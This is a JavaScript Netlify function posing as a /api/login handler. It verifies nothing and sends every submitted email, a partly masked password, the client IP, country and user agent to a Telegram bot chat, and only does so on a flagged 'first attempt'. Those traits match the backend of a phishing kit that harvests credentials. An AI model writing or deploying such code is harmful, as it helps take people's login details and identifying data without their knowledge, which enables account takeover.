// netlify/functions/login.js
// Netlify Function that implements the same /api/login behavior as your original server.
// - Handles OPTIONS preflight (CORS) so browser fetch with X-First-Attempt works.
// - Preserves "first attempt" logic (checks X-First-Attempt header).
// - Masks password before forwarding and escapes MarkdownV2 for Telegram.
// - Uses global fetch (Node 18+ on Netlify). No extra dependencies required.
//
// Deploy: Netlify will expose this at /.netlify/functions/login
// We add a rewrite in netlify.toml so your client can keep POSTing to /api/login.

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-First-Attempt'
};

function escapeMarkdownV2(str = '') {
  // escape characters required by MarkdownV2 for Telegram
  return String(str).replace(/([_\*\[\]\(\)~`>#+\-=|{}\.!])/g, '\\$1');
}

function maskPassword(p = '') {
  if (!p) return '';
  if (p.length <= 2) return '*'.repeat(p.length);
  return p[0] + '*'.repeat(Math.max(0, p.length - 2)) + p.slice(-1);
}

exports.handler = async (event, context) => {
  // Handle CORS preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 204,
      headers: CORS_HEADERS,
      body: ''
    };
  }

  try {
    // parse body
    let body;
    try {
      body = event.body ? JSON.parse(event.body) : {};
    } catch (e) {
      return {
        statusCode: 400,
        headers: CORS_HEADERS,
        body: JSON.stringify({ error: 'invalid_json' })
      };
    }

    const email = body.email || '';
    const password = body.password || '';
    const country = body.country || '';
    const userAgent = body.userAgent || event.headers['user-agent'] || '';
    const forwardedFor = event.headers['x-forwarded-for'] || '';
    const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : (event.requestContext && event.requestContext.identity && event.requestContext.identity.sourceIp) || 'unknown';

    if (!email || !password) {
      return {
        statusCode: 400,
        headers: CORS_HEADERS,
        body: JSON.stringify({ error: 'Missing email or password' })
      };
    }

    const isFirstAttempt = (event.headers['x-first-attempt'] === '1') || (event.headers['X-First-Attempt'] === '1');

    // Compose message (mask password and escape MarkdownV2)
    const now = new Date();
    const textLines = [
      '*Login Attempt Received*',
      `Email: ${escapeMarkdownV2(String(email))}`,
      `Password: ${escapeMarkdownV2(maskPassword(String(password)))}`,
      `IP: ${escapeMarkdownV2(String(ip))}`,
      `Country: ${escapeMarkdownV2(String(country || ''))}`,
      `User-Agent: ${escapeMarkdownV2(String(userAgent || ''))}`,
      `Time (UTC): ${escapeMarkdownV2(now.toISOString())}`
    ];
    const text = textLines.join('\n');

    // If not first attempt, do not forward to Telegram
    if (!isFirstAttempt) {
      return {
        statusCode: 200,
        headers: CORS_HEADERS,
        body: JSON.stringify({ forwarded: false, reason: 'not_first_attempt' })
      };
    }

    // If Telegram not configured, log and respond (so client sees success)
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log('Telegram not configured — would forward this message:\n', text);
      return {
        statusCode: 200,
        headers: CORS_HEADERS,
        body: JSON.stringify({ forwarded: false, warning: 'telegram_not_configured' })
      };
    }

    // Send to Telegram server-side (avoids browser CORS issues and keeps token secret)
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      parse_mode: 'MarkdownV2',
      text
    };

    // use global fetch (Netlify Node runtime supports fetch). Fallback not required on Netlify.
    const tgRes = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      // no-cors not needed; this is server-side
    });

    let tgJson;
    try {
      tgJson = await tgRes.json();
    } catch (e) {
      console.error('Failed parsing Telegram response', e);
      return {
        statusCode: 502,
        headers: CORS_HEADERS,
        body: JSON.stringify({ error: 'telegram_response_parse_failed' })
      };
    }

    if (!tgJson || !tgJson.ok) {
      console.error('Telegram API returned error:', tgJson);
      return {
        statusCode: 502,
        headers: CORS_HEADERS,
        body: JSON.stringify({ error: 'Telegram API error', details: tgJson })
      };
    }

    // success
    return {
      statusCode: 200,
      headers: CORS_HEADERS,
      body: JSON.stringify({ forwarded: true })
    };
  } catch (err) {
    console.error('Error in function login:', err && (err.stack || err.message || err));
    return {
      statusCode: 500,
      headers: CORS_HEADERS,
      body: JSON.stringify({ error: 'server_error', message: err && (err.message || String(err)) })
    };
  }
};